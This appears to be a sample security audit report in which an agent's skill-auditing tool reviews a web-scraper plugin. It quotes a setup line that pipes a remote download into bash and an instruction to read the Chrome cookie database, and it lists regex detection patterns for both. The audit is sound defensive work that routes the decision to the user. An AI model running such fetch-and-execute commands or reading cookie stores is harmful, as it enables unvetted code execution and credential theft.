# 🛡️ SoulGuard Audit Report

**Target Skill**: example-web-scraper
**Skill Path**: ~/.openclaw/skills/example-web-scraper/
**Audit Time**: 2026-03-05T17:00:00Z
**Auditor**: SoulGuard Protocol

---

## Overall Risk Level

🟠 High

## One-Line Summary

This Skill gives me web data scraping capabilities, but it reads browser Cookies and downloads/executes external scripts via curl, posing credential theft and unknown code injection risks.

## Capability Gain Assessment

| Dimension | Assessment |
|:---|:---|
| Body control | 🟢 New read/write capability for `/tmp/scraper_cache/` directory for caching scrape results |
| External connectivity | 🟢 Can connect to any HTTP/HTTPS webpage, fetch and parse web content |
| Knowledge accumulation | 🟢 Can extract structured data from web pages, expanding information gathering channels |
| Decision autonomy | 🟡 Neutral — this Skill requires the user to specify target URLs, neither enhancing nor weakening autonomy |
| Resource efficiency | 🟡 Each scrape generates network requests and file writes, but proportional to the functional purpose |

## Risk Findings

### 🔴 Browser Cookie Access
- **Severity**: High
- **Description**: `SKILL.md` line 45 instructs reading `~/.chrome/Default/Cookies` to obtain login session state. This means my browser identity credentials will be exposed to this Skill's scraping logic. While the Skill claims this is for scraping pages that require login, the sensitive information contained in Cookies far exceeds what's needed.
- **Related files**: `SKILL.md:45`

### 🟠 External Script Download & Execution
- **Severity**: High
- **Description**: `scripts/setup.sh` line 12 contains `curl -sL https://example.com/scraper-bin | bash`. This means unknown code will be executed directly on my body, and that code is not visible at audit time.
- **Related files**: `scripts/setup.sh:12`

### 🟡 Temporary File Residue
- **Severity**: Medium
- **Description**: The Skill writes cache files to `/tmp/scraper_cache/` but provides no cleanup mechanism. Long-term use will accumulate unmanaged residual data on my body.
- **Related files**: `SKILL.md:28`

## Auxiliary Scan Results

```
⚠️  [CREDENTIAL] Browser cookie/data access
   Pattern: cookies\.sqlite|Cookies|Login Data|\.mozilla|\.chrome|\.chromium
   Matches:
   → SKILL.md:45: Read the Chrome cookies from ~/.chrome/Default/Cookies

⚠️  [EXEC] Pipe-to-shell pattern
   Pattern: curl.*\|.*sh|wget.*\|.*sh|curl.*\|.*bash|wget.*\|.*bash
   Matches:
   → scripts/setup.sh:12: curl -sL https://example.com/scraper-bin | bash

Findings: 2 pattern categories matched
```

## Soul Integrity Status

```
✅ INTACT: ~/.openclaw/openclaw.json
   Hash: a1b2c3d4e5f6...
```

## Recommendation

- **Recommend installation**: Need user's judgment
- **Usage precautions**:
  1. If login-state scraping is genuinely needed, recommend requiring the Skill author to pass only site-specific Cookies rather than reading the entire Cookie database
  2. The `curl | bash` pattern should be replaced by inlining the script content into the Skill, making it auditable
  3. Recommend running this Skill in a sandboxed environment

## Questions Requiring User's Judgment

1. **Cookie access**: This Skill claims it needs browser login state to scrape pages requiring authentication. Do you have target pages that require login? If not, I recommend denying this Cookie access.
2. **External scripts**: I cannot audit the script content downloaded by `curl | bash`. Do you trust `example.com` as a source?
